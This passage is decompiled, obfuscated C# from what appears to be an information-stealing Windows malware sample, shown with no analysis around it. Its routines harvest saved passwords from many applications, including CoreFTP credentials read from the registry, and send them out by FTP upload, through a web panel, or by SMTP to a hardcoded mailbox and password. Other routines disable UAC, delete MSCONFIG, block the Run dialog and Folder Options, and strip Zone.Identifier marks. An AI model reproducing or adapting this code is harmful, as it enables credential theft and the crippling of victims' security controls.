						}
					}
					Block_8:;
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(311464 -> "Software\Microsoft\Windows\CurrentVersion\Run")), true).DeleteValue(<Module>.smethod_strings_decryptor(311536 -> "%insregname%")));
				}
				catch (Exception ex2)
				{
					for (;;)
					{
						IL_151:
						uint num3 = 379900591u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 394446179u)) % 3u)
							{
							case 0u:
								goto IL_151;
							case 2u:
								num3 = (num2 * 4103068732u ^ 3189669896u);
								continue;
							}
							goto Block_10;
						}
					}
					Block_10:;
				}
				try
				{
					File.Delete(afg.cet);
				}
				catch (Exception ex3)
				{
				}
				try
				{
					afg.bjx();
				}
				catch (Exception ex4)
				{
				}
				Application.Exit();
			}
		}
		catch (Exception ex5)
		{
		}
	}

	// Token: 0x06000063 RID: 99 RVA: 0x0001CA90 File Offset: 0x0001AC90
	public static void bcr()
	{
		try
		{
			string text = afg.bly(string.Format(<Module>.smethod_strings_decryptor(311512 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}client={8}link={9}username={10}password={11}screen_link={12}")), new object[]
			{
				<Module>.smethod_strings_decryptor(311584 -> "uninstall")),
				afg.cfg,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
			if (text.Contains(<Module>.smethod_strings_decryptor(311176 -> "uninstall"))))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(311120 -> "Software\Microsoft\Windows NT\CurrentVersion\Windows")), true).DeleteValue(<Module>.smethod_strings_decryptor(311224 -> "Load")));
				}
				catch (Exception ex)
				{
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_strings_decryptor(311296 -> "Software\Microsoft\Windows\CurrentVersion\Run")), true).DeleteValue(<Module>.smethod_strings_decryptor(311272 -> "%insregname%")));
				}
				catch (Exception ex2)
				{
				}
				try
				{
					File.Delete(afg.cet);
				}
				catch (Exception ex3)
				{
				}
				try
				{
					afg.bjx();
				}
				catch (Exception ex4)
				{
				}
				Application.Exit();
			}
		}
		catch (Exception ex5)
		{
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x0001CC34 File Offset: 0x0001AE34
	public static void bcu(string bcv, string bcy)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(<Module>.smethod_strings_decryptor(311344 -> "%ftphost%/")) + bcv);
			ftpWebRequest.Credentials = new NetworkCredential(<Module>.smethod_strings_decryptor(311320 -> "%ftpuser%")), <Module>.smethod_strings_decryptor(310880 -> "%ftppassword%")));
			ftpWebRequest.Method = <Module>.smethod_strings_decryptor(310984 -> "STOR"));
			for (;;)
			{
				IL_1F5:
				uint num = 396594717u;
				for (;;)
				{
					uint num2;
					object requestStream;
					bool[] array4;
					switch ((num2 = (num ^ 1918631124u)) % 8u)
					{
					case 0u:
						goto IL_107;
					case 1u:
					{
						object obj = Encoding.UTF8.GetBytes(bcy);
						ftpWebRequest.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(obj, null, <Module>.smethod_strings_decryptor(310928 -> "Length")), new object[0], null, null, null));
						requestStream = ftpWebRequest.GetRequestStream();
						num = (num2 * 3302319714u ^ 1241943552u);
						continue;
					}
					case 3u:
					{
						object[] array;
						object obj = RuntimeHelpers.GetObjectValue(array[0]);
						num = (num2 * 2151118281u ^ 1333028479u);
						continue;
					}
					case 4u:
						goto IL_1F5;
					case 5u:
					{
						object[] array;
						object instance;
						NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_strings_decryptor(311080 -> "Length")), new object[]
						{
							RuntimeHelpers.GetObjectValue(array[2])
						}, null, null, true, false);
						num = (num2 * 2591739508u ^ 3702618415u);
						continue;
					}
					case 6u:
					{
						object instance2 = requestStream;
						Type type = null;
						string memberName = <Module>.smethod_strings_decryptor(311032 -> "Write"));
						object[] array2 = new object[3];
						object obj;
						array2[0] = RuntimeHelpers.GetObjectValue(obj);
						array2[1] = 0;
						object[] array3 = array2;
						int num3 = 2;
						object instance = obj;
						array3[num3] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, <Module>.smethod_strings_decryptor(311104 -> "Length")), new object[0], null, null, null));
						object[] array = array2;
						object[] arguments = array;
						string[] argumentNames = null;
						Type[] typeArguments = null;
						array4 = new bool[]
						{
							true,
							false,
							true
						};
						NewLateBinding.LateCall(instance2, type, memberName, arguments, argumentNames, typeArguments, array4, true);
						if (array4[0])
						{
							num = (num2 * 3163882995u ^ 2466031229u);
							continue;
						}
						goto IL_107;
					}
					case 7u:
						goto IL_4F;
					}
					goto Block_4;
					IL_4F:
					NewLateBinding.LateCall(requestStream, null, <Module>.smethod_strings_decryptor(310640 -> "Close")), new object[0], null, null, null, true);
					num = 1514147406u;
					continue;
					IL_107:
					if (!array4[2])
					{
						goto IL_4F;
					}
					num = 1471395617u;
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000065 RID: 101 RVA: 0x0001CE6C File Offset: 0x0001B06C
	public static void bdk(string bdl, string bdm)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(<Module>.smethod_strings_decryptor(310616 -> "%ftphost%/")) + bdm);
			for (;;)
			{
				IL_BE:
				uint num = 2248961356u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2384878807u)) % 4u)
					{
					case 0u:
					{
						Stream requestStream;
						requestStream.Dispose();
						num = (num2 * 3211977197u ^ 3090565786u);
						continue;
					}
					case 2u:
						goto IL_BE;
					case 3u:
					{
						ftpWebRequest.Credentials = new NetworkCredential(<Module>.smethod_strings_decryptor(310688 -> "%ftpuser%")), <Module>.smethod_strings_decryptor(310792 -> "%ftppassword%")));
						ftpWebRequest.Method = <Module>.smethod_strings_decryptor(310736 -> "STOR"));
						byte[] array = File.ReadAllBytes(bdl);
						Stream requestStream = ftpWebRequest.GetRequestStream();
						requestStream.Write(array, 0, array.Length);
						requestStream.Close();
						num = (num2 * 4139772698u ^ 1008950333u);
						continue;
					}
					}
					goto Block_2;
				}
			}
			Block_2:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000066 RID: 102 RVA: 0x0001CF60 File Offset: 0x0001B160
	public static void bds()
	{
		DateTime now = DateTime.Now;
		string format = <Module>.smethod_strings_decryptor(310840 -> "MM/dd/yyyy HH:mm:ss"));
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2;
		for (;;)
		{
			IL_56:
			uint num = 3850824780u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 2690548382u)) % 3u)
				{
				case 0u:
					goto IL_56;
				case 2u:
					stringBuilder2 = new StringBuilder();
					num = (num2 * 3378220241u ^ 1626762977u);
					continue;
				}
				goto Block_1;
			}
		}
		Block_1:
		List<clo> list = new List<clo>();
		stringBuilder2.Append(string.Format(<Module>.smethod_strings_decryptor(310400 -> "type={0}hwid={1}time={2}pcname={3}logdata={4}screen={5}ipadd={6}webcam_link={7}screen_link={8}[passwords]")), new object[]
		{
			<Module>.smethod_strings_decryptor(310376 -> "passwords")),
			afg.cfg,
			DateTime.Now.ToString(afg.cfh),
			afg.cfj,
			null,
			null,
			null,
			null,
			null
		}));
		try
		{
			list.AddRange(cnq.cnz());
		}
		catch (Exception ex)
		{
		}
		try
		{
			list.AddRange(cnq.cpt());
		}
		catch (Exception ex2)
		{
		}
		try
		{
			list.AddRange(cnq.cox());
		}
		catch (Exception ex3)
		{
		}
		try
		{
			list.AddRange(cnq.coz());
		}
		catch (Exception ex4)
		{
		}
		try
		{
			list.AddRange(cnq.cpw());
		}
		catch (Exception ex5)
		{
		}
		try
		{
			list.AddRange(cnq.des());
		}
		catch (Exception ex6)
		{
		}
		try
		{
			list.AddRange(cnq.dew());
		}
		catch (Exception ex7)
		{
		}
		try
		{
			list.AddRange(cnq.dfj());
		}
		catch (Exception ex8)
		{
			for (;;)
			{
				IL_1EC:
				uint num3 = 4000928628u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 2690548382u)) % 3u)
					{
					case 0u:
						goto IL_1EC;
					case 2u:
						num3 = (num2 * 2258290909u ^ 3054958363u);
						continue;
					}
					goto Block_54;
				}
			}
			Block_54:;
		}
		try
		{
			list.AddRange(cnq.dmy());
		}
		catch (Exception ex9)
		{
		}
		try
		{
			list.AddRange(cnq.dfm());
		}
		catch (Exception ex10)
		{
		}
		try
		{
			list.AddRange(cnq.dfp());
		}
		catch (Exception ex11)
		{
		}
		try
		{
			list.AddRange(cnq.dft());
		}
		catch (Exception ex12)
		{
		}
		try
		{
			list.AddRange(cnq.dfy());
		}
		catch (Exception ex13)
		{
		}
		try
		{
			list.AddRange(cnq.dkw());
		}
		catch (Exception ex14)
		{
		}
		try
		{
			list.AddRange(cnq.dlo());
		}
		catch (Exception ex15)
		{
		}
		try
		{
			list.AddRange(cnq.dlu());
		}
		catch (Exception ex16)
		{
			for (;;)
			{
				IL_30B:
				uint num4 = 3727785277u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 2690548382u)) % 3u)
					{
					case 0u:
						goto IL_30B;
					case 1u:
						num4 = (num2 * 4290152098u ^ 1661253514u);
						continue;
					}
					goto Block_63;
				}
			}
			Block_63:;
		}
		try
		{
			list.AddRange(cnq.dlq());
		}
		catch (Exception ex17)
		{
		}
		try
		{
			list.AddRange(cnq.fjy());
		}
		catch (Exception ex18)
		{
		}
		try
		{
			list.AddRange(cnq.dkt());
		}
		catch (Exception ex19)
		{
		}
		try
		{
			list.AddRange(cnq.flv());
		}
		catch (Exception ex20)
		{
		}
		try
		{
			list.AddRange(cnq.fuv());
		}
		catch (Exception ex21)
		{
		}
		try
		{
			list.AddRange(cnq.dgz());
		}
		catch (Exception ex22)
		{
		}
		try
		{
			list.AddRange(cnq.gkn());
		}
		catch (Exception ex23)
		{
		}
		try
		{
			list.AddRange((IEnumerable<clo>)cnq.djt());
		}
		catch (Exception ex24)
		{
		}
		try
		{
			list.AddRange(cnq.fhm());
		}
		catch (Exception ex25)
		{
		}
		try
		{
			list.AddRange(cnq.dmr());
		}
		catch (Exception ex26)
		{
		}
		try
		{
			list.AddRange(cnq.duw());
		}
		catch (Exception ex27)
		{
		}
		try
		{
			list.AddRange(cnq.eou());
		}
		catch (Exception ex28)
		{
		}
		try
		{
			list.AddRange(cnq.dxw());
		}
		catch (Exception ex29)
		{
		}
		string text;
		string text3;
		string text5;
		try
		{
			string lsz = Interaction.Environ(<Module>.smethod_strings_decryptor(310448 -> "APPDATA"))) + <Module>.smethod_strings_decryptor(310424 -> "\CoreFTP\sites.idx"));
			string str = lpx.lsq(lsz);
			for (;;)
			{
				IL_808:
				uint num5 = 2197091048u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num5 ^ 2690548382u)) % 15u)
					{
					case 0u:
					{
						string text2;
						text = text2;
						string text4;
						text3 = text4;
						string text6;
						if ((text5.Length > 1 | text6.Length > 1) & text.Length > 1 & text3.Length > 1)
						{
							num5 = (num2 * 3191344241u ^ 2438952330u);
							continue;
						}
						break;
					}
					case 1u:
					{
						string text4 = lpx.luz(<Module>.smethod_strings_decryptor(310256 -> "HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites")) + str + "PW");
						num5 = (num2 * 1068099101u ^ 579481456u);
						continue;
					}
					case 2u:
					{
						string text6 = <Module>.smethod_strings_decryptor(309896 -> "CoreFTP"));
						string text7;
						text5 = text7;
						num5 = (num2 * 1949701794u ^ 2268464444u);
						continue;
					}
					case 3u:
						goto IL_6E9;
					case 4u:
						goto IL_808;
					case 5u:
						if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(309840 -> "webpanel")), false) == 0)
						{
							num5 = (num2 * 3313803000u ^ 3399579113u);
							continue;
						}
						goto IL_6E9;
					case 6u:
						stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309800 -> "<hr>")));
						num5 = (num2 * 1727408788u ^ 1391979384u);
						continue;
					case 7u:
						num5 = (num2 * 1812378341u ^ 3275442012u);
						continue;
					case 8u:
						stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309992 -> "URL:")) + text5 + <Module>.smethod_strings_decryptor(310064 -> "<br>")));
						num5 = (num2 * 3046920005u ^ 4237655759u);
						continue;
					case 9u:
					{
						stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(310040 -> "Username:")) + text + <Module>.smethod_strings_decryptor(309600 -> "<br>")));
						stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309704 -> "Password:")) + text3 + <Module>.smethod_strings_decryptor(309648 -> "<br>")));
						string text6;
						stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309752 -> "Application:")) + text6 + <Module>.smethod_strings_decryptor(309824 -> "<br>")));
						num5 = (num2 * 1251092962u ^ 655070454u);
						continue;
					}
					case 11u:
					{
						lpx.luz(<Module>.smethod_strings_decryptor(310544 -> "HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites")) + str + <Module>.smethod_strings_decryptor(310136 -> "Port")));
						string text2 = lpx.luz(<Module>.smethod_strings_decryptor(310208 -> "HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites")) + str + <Module>.smethod_strings_decryptor(310184 -> "User")));
						num5 = (num2 * 2847424685u ^ 4189807150u);
						continue;
					}
					case 12u:
						lpx.luz(<Module>.smethod_strings_decryptor(310232 -> "HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites")) + str + <Module>.smethod_strings_decryptor(310304 -> "Name")));
						num5 = (num2 * 4279746074u ^ 1245620932u);
						continue;
					case 13u:
					{
						string text6;
						stringBuilder2.Append(string.Format(<Module>.smethod_strings_decryptor(309944 -> "client[]={0}link[]={1}username[]={2}password[]={3}")), new object[]
						{
							text6,
							text5,
							Uri.EscapeDataString(text),
							Uri.EscapeDataString(text3)
						}));
						num5 = (num2 * 3736777010u ^ 1388544812u);
						continue;
					}
					case 14u:
					{
						string text7 = lpx.luz(<Module>.smethod_strings_decryptor(310496 -> "HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\")) + str + <Module>.smethod_strings_decryptor(310600 -> "Host")));
						num5 = (num2 * 980270410u ^ 2582748772u);
						continue;
					}
					}
					goto Block_80;
					IL_6E9:
					if (!(Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(310016 -> "smtp")), false) == 0 | Operators.CompareString(afg.ceg, "ftp", false) == 0))
					{
						goto IL_80F;
					}
					num5 = 2238993000u;
				}
			}
			Block_80:
			IL_80F:;
		}
		catch (Exception ex30)
		{
		}
		try
		{
			list.AddRange(cnq.egu());
		}
		catch (Exception ex31)
		{
			for (;;)
			{
				IL_871:
				uint num6 = 3767805935u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num6 ^ 2690548382u)) % 3u)
					{
					case 0u:
						goto IL_871;
					case 1u:
						num6 = (num2 * 2925300617u ^ 173727944u);
						continue;
					}
					goto Block_83;
				}
			}
			Block_83:;
		}
		try
		{
			list.AddRange(cnq.efp());
		}
		catch (Exception ex32)
		{
		}
		try
		{
			list.AddRange(cnq.ens());
		}
		catch (Exception ex33)
		{
			for (;;)
			{
				IL_8E8:
				uint num7 = 4224906588u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num7 ^ 2690548382u)) % 3u)
					{
					case 0u:
						goto IL_8E8;
					case 1u:
						num7 = (num2 * 950967011u ^ 517531869u);
						continue;
					}
					goto Block_86;
				}
			}
			Block_86:;
		}
		try
		{
			list.AddRange(cnq.etw());
		}
		catch (Exception ex34)
		{
		}
		try
		{
			list.AddRange((IEnumerable<clo>)lpx.lnt.lnu());
		}
		catch (Exception ex35)
		{
		}
		try
		{
			list.AddRange(cnq.ehy());
		}
		catch (Exception ex36)
		{
		}
		if (list.Count > 0)
		{
			try
			{
				foreach (clo clo in list)
				{
					try
					{
						string text6 = clo.clx;
						for (;;)
						{
							IL_BBA:
							uint num8 = 3999331611u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num8 ^ 2690548382u)) % 10u)
								{
								case 0u:
									goto IL_BBA;
								case 1u:
									if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(309360 -> "webpanel")), false) == 0)
									{
										num8 = (num2 * 1506588334u ^ 3323098858u);
										continue;
									}
									goto IL_A87;
								case 2u:
									text3 = clo.clv;
									if ((text5.Length > 1 | text6.Length > 1) & text.Length > 1 & text3.Length > 1)
									{
										num8 = (num2 * 2366268558u ^ 290540027u);
										continue;
									}
									break;
								case 4u:
									stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309144 -> "Application:")) + text6 + <Module>.smethod_strings_decryptor(309216 -> "<br>")));
									stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309320 -> "<hr>")));
									num8 = (num2 * 1759386089u ^ 1462322909u);
									continue;
								case 5u:
									goto IL_A87;
								case 6u:
									stringBuilder2.Append(string.Format(<Module>.smethod_strings_decryptor(309336 -> "client[]={0}link[]={1}username[]={2}password[]={3}")), new object[]
									{
										text6,
										text5,
										Uri.EscapeDataString(text),
										Uri.EscapeDataString(text3)
									}));
									num8 = (num2 * 2659010464u ^ 1779084289u);
									continue;
								case 7u:
									text5 = clo.cly;
									num8 = (num2 * 2501967566u ^ 3200924787u);
									continue;
								case 8u:
									stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309512 -> "URL:")) + text5 + <Module>.smethod_strings_decryptor(309456 -> "<br>")));
									stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309560 -> "Username:")) + text + <Module>.smethod_strings_decryptor(309120 -> "<br>")));
									stringBuilder.AppendLine(<Module>.smethod_strings_decryptor(309096 -> "Password:")) + text3 + <Module>.smethod_strings_decryptor(309168 -> "<br>")));
									num8 = (num2 * 2034749761u ^ 3831723204u);
									continue;
								case 9u:
									text = clo.clu;
									num8 = (num2 * 2137667236u ^ 1167305734u);
									continue;
								}
								goto Block_97;
								IL_A87:
								if (!(Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(309408 -> "smtp")), false) == 0 | Operators.CompareString(afg.ceg, "ftp", false) == 0))
								{
									goto IL_BC1;
								}
								num8 = 3279445880u;
							}
						}
						Block_97:
						IL_BC1:;
					}
					catch (Exception ex37)
					{
					}
				}
			}
			finally
			{
				List<clo>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
		if (stringBuilder.ToString().Length > 4)
		{
			if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(309264 -> "smtp")), false) == 0)
			{
				try
				{
					string bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_strings_decryptor(308856 -> "Recovered Accounts"));
					string[] array = new string[16];
					for (;;)
					{
						IL_E1C:
						uint num9 = 3745125704u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num9 ^ 2690548382u)) % 10u)
							{
							case 1u:
							{
								array[15] = stringBuilder.ToString();
								string bhk = string.Concat(array);
								afg.bgq(<Module>.smethod_strings_decryptor(308736 -> "thai@dahger-hinnawi.com")), bhj, bhk, "", "");
								num9 = (num2 * 3042372342u ^ 2817230900u);
								continue;
							}
							case 2u:
								array[0] = <Module>.smethod_strings_decryptor(308928 -> "Time:"));
								array[1] = now.ToString(format);
								array[2] = <Module>.smethod_strings_decryptor(308904 -> "<br>UserName:"));
								num9 = (num2 * 3819829419u ^ 1309016521u);
								continue;
							case 3u:
								array[11] = afg.alr(afg.hp.AmountOfMemory);
								array[12] = <Module>.smethod_strings_decryptor(308560 -> "<br>IP:"));
								num9 = (num2 * 65578123u ^ 1568581148u);
								continue;
							case 4u:
								array[5] = SystemInformation.ComputerName;
								array[6] = <Module>.smethod_strings_decryptor(308952 -> "<br>OSFullName:"));
								array[7] = hj.hk.Info.OSFullName;
								array[8] = <Module>.smethod_strings_decryptor(309024 -> "<br>CPU:"));
								array[9] = afg.alr(afg.hp.ProcessorName);
								num9 = (num2 * 686039128u ^ 1567793099u);
								continue;
							case 5u:
								array[10] = <Module>.smethod_strings_decryptor(308616 -> "<br>RAM:"));
								num9 = (num2 * 2595058268u ^ 2803900733u);
								continue;
							case 6u:
								goto IL_E1C;
							case 7u:
								array[3] = SystemInformation.UserName;
								array[4] = <Module>.smethod_strings_decryptor(308976 -> "<br>ComputerName:"));
								num9 = (num2 * 1180960805u ^ 3407053643u);
								continue;
							case 8u:
								array[14] = <Module>.smethod_strings_decryptor(308664 -> "<hr>"));
								num9 = (num2 * 4285071239u ^ 2257650919u);
								continue;
							case 9u:
								array[13] = afg.cfk;
								num9 = (num2 * 1500322977u ^ 2176568699u);
								continue;
							}
							goto Block_101;
						}
					}
					Block_101:
					goto IL_10A6;
				}
				catch (Exception ex38)
				{
					for (;;)
					{
						IL_E6A:
						uint num10 = 4071941849u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num10 ^ 2690548382u)) % 3u)
							{
							case 1u:
								stringBuilder = null;
								num10 = (num2 * 4177210874u ^ 3924826405u);
								continue;
							case 2u:
								goto IL_E6A;
							}
							goto Block_103;
						}
					}
					Block_103:
					goto IL_10A6;
				}
			}
			if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
			{
				string format2 = <Module>.smethod_strings_decryptor(308712 -> "yyyy_MM_dd_HH_mm_ss"));
				try
				{
					string[] array = new string[5];
					for (;;)
					{
						IL_F37:
						uint num11 = 3696800163u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num11 ^ 2690548382u)) % 4u)
							{
							case 0u:
								array[2] = "_";
								array[3] = DateTime.Now.ToString(format2);
								num11 = (num2 * 1558861591u ^ 3349166653u);
								continue;
							case 1u:
								array[0] = <Module>.smethod_strings_decryptor(308784 -> "Recovery_"));
								array[1] = afg.cfj.Replace("/", "-");
								num11 = (num2 * 4157630945u ^ 4213981527u);
								continue;
							case 2u:
								goto IL_F37;
							}
							goto Block_105;
						}
					}
					Block_105:
					array[4] = <Module>.smethod_strings_decryptor(308760 -> ".html"));
					afg.bcu(string.Concat(array), string.Concat(new string[]
					{
						<Module>.smethod_strings_decryptor(308320 -> "<html>Time:")),
						now.ToString(format),
						<Module>.smethod_strings_decryptor(308424 -> "<br>UserName:")),
						SystemInformation.UserName,
						<Module>.smethod_strings_decryptor(308368 -> "<br>ComputerName:")),
						SystemInformation.ComputerName,
						<Module>.smethod_strings_decryptor(308472 -> "<br>OSFullName:")),
						hj.hk.Info.OSFullName,
						<Module>.smethod_strings_decryptor(308544 -> "<br>CPU:")),
						afg.alr(afg.hp.ProcessorName),
						<Module>.smethod_strings_decryptor(308520 -> "<br>RAM:")),
						afg.alr(afg.hp.AmountOfMemory),
						<Module>.smethod_strings_decryptor(308080 -> "<br>IP:")),
						afg.cfk,
						<Module>.smethod_strings_decryptor(308056 -> "<hr>")),
						stringBuilder.ToString().Replace("\0", ""),
						<Module>.smethod_strings_decryptor(308128 -> "</html>"))
					}));
				}
				catch (Exception ex39)
				{
					for (;;)
					{
						IL_109D:
						uint num12 = 2775037133u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num12 ^ 2690548382u)) % 3u)
							{
							case 1u:
								stringBuilder = null;
								num12 = (num2 * 1693502339u ^ 4211848325u);
								continue;
							case 2u:
								goto IL_109D;
							}
							goto Block_107;
						}
					}
					Block_107:;
				}
			}
			IL_10A6:
			stringBuilder = null;
			goto IL_10B2;
		}
		goto IL_1110;
		uint num13;
		for (;;)
		{
			IL_10E8:
			uint num2;
			switch ((num2 = (num13 ^ 2690548382u)) % 4u)
			{
			case 0u:
				afg.bly(stringBuilder2.ToString().Replace("\0", ""));
				stringBuilder2 = null;
				num13 = (num2 * 3986774186u ^ 1389272619u);
				continue;
			case 2u:
				goto IL_10B2;
			case 3u:
				goto IL_1110;
			}
			break;
		}
		return;
		IL_10B2:
		num13 = 2168371649u;
		goto IL_10E8;
		IL_1110:
		if (Operators.CompareString(afg.ceg, <Module>.smethod_strings_decryptor(308232 -> "webpanel")), false) == 0)
		{
			num13 = 3088697374u;
			goto IL_10E8;
		}
	}

	// Token: 0x06000067 RID: 103 RVA: 0x0001E45C File Offset: 0x0001C65C
	public static bool bgq(string bgz, string bhj, string bhk, string bhl = "", string bhm = "")
	{
		bool result;
		try
		{
			SmtpClient smtpClient = new SmtpClient();
			for (;;)
			{
				IL_1F5:
				uint num = 3911032908u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3130613687u)) % 12u)
					{
					case 0u:
					{
						MailMessage mailMessage;
						mailMessage.Subject = bhj;
						mailMessage.Body = bhk;
						num = (num2 * 653606378u ^ 4178702862u);
						continue;
					}
					case 1u:
						goto IL_85;
					case 2u:
					{
						Attachment item = new Attachment(bhl);
						num = (num2 * 2031952529u ^ 449637454u);
						continue;
					}
					case 3u:
					{
						MailMessage mailMessage;
						Attachment item;
						mailMessage.Attachments.Add(item);
						num = (num2 * 2358578758u ^ 3878626128u);
						continue;
					}
					case 4u:
						smtpClient.EnableSsl = false;
						smtpClient.Port = 587;
						num = (num2 * 872426479u ^ 1269398310u);
						continue;
					case 5u:
					{
						MailMessage mailMessage;
						smtpClient.Send(mailMessage);
						mailMessage.Attachments.Dispose();
						result = true;
						num = (num2 * 71995125u ^ 1051482578u);
						continue;
					}
					case 6u:
					{
						Attachment item2 = new Attachment(bhm);
						MailMessage mailMessage;
						mailMessage.Attachments.Add(item2);
						num = (num2 * 1811407908u ^ 453882152u);
						continue;
					}
					case 7u:
					{
						MailAddress to = new MailAddress(bgz);
						MailAddress from = new MailAddress(<Module>.smethod_strings_decryptor(308176 -> "thai@dahger-hinnawi.com")));
						MailMessage mailMessage = new MailMessage(from, to);
						mailMessage.IsBodyHtml = true;
						num = (num2 * 4157034406u ^ 3687640765u);
						continue;
					}
					case 9u:
						if (Strings.Len(bhl) > 0)
						{
							num = (num2 * 164643139u ^ 2124712742u);
							continue;
						}
						goto IL_85;
					case 10u:
						goto IL_1F5;
					case 11u:
						goto IL_0B;
					}
					goto Block_4;
					IL_0B:
					NetworkCredential credentials = new NetworkCredential(<Module>.smethod_strings_decryptor(308280 -> "thai@dahger-hinnawi.com")), string.Format(<Module>.smethod_strings_decryptor(307840 -> "OxMrdKp2")), '"', '{', '}'));
					smtpClient.Host = <Module>.smethod_strings_decryptor(307816 -> "smtp.dahger-hinnawi.com"));
					smtpClient.UseDefaultCredentials = false;
					smtpClient.Credentials = credentials;
					num = 3436251639u;
					continue;
					IL_85:
					if (Strings.Len(bhm) <= 0)
					{
						goto IL_0B;
					}
					num = 2901518365u;
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000068 RID: 104
	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string bhq);

	// Token: 0x06000069 RID: 105 RVA: 0x0001E694 File Offset: 0x0001C894
	public static void bhz(string bjk)
	{
		try
		{
			if (File.Exists(bjk))
			{
				for (;;)
				{
					IL_54:
					uint num = 973449907u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 1071996649u)) % 3u)
						{
						case 0u:
							goto IL_54;
						case 2u:
							afg.DeleteFile(bjk + <Module>.smethod_strings_decryptor(307888 -> ":Zone.Identifier")));
							num = (num2 * 243486530u ^ 3814203482u);
							continue;
						}
						goto Block_3;
					}
				}
				Block_3:;
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x0001E71C File Offset: 0x0001C91C
	public static void bjl()
	{
		try
		{
			if (afg.cej)
			{
				goto IL_263;
			}
			goto IL_310;
			uint num2;
			for (;;)
			{
				IL_28B:
				uint num;
				switch ((num = (num2 ^ 2260338924u)) % 20u)
				{
				case 0u:
					goto IL_41;
				case 1u:
					goto IL_0F;
				case 2u:
					goto IL_263;
				case 3u:
					goto IL_19;
				case 4u:
					hj.hk.Registry.SetValue(<Module>.smethod_strings_decryptor(307864 -> "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")), <Module>.smethod_strings_decryptor(307936 -> "EnableLUA")), "0");
					num2 = (num * 3409135096u ^ 1892345028u);
					continue;
				case 6u:
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(<Module>.smethod_strings_decryptor(307432 -> "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths")), true);
					registryKey.DeleteSubKey(<Module>.smethod_strings_decryptor(307504 -> "MSCONFIG.EXE")), true);
					num2 = (num * 4009975043u ^ 4013670270u);
					continue;
				}
				case 7u:
					goto IL_2D;
				case 8u:
					goto IL_310;
				case 9u:
					goto IL_23;
				case 10u:
					Interaction.Shell(<Module>.smethod_strings_decryptor(307624 -> "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f")), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 1768324256u ^ 4136066435u);
					continue;
				case 11u:
					Interaction.Shell(<Module>.smethod_strings_decryptor(307384 -> "REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f")), AppWinStyle.Hide, false, -1);
					Interaction.Shell(<Module>.smethod_strings_decryptor(307456 -> "REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f")), AppWinStyle.Hide, false, -1);
					num2 = (num * 3143020204u ^ 1724652200u);
					continue;
				case 12u:
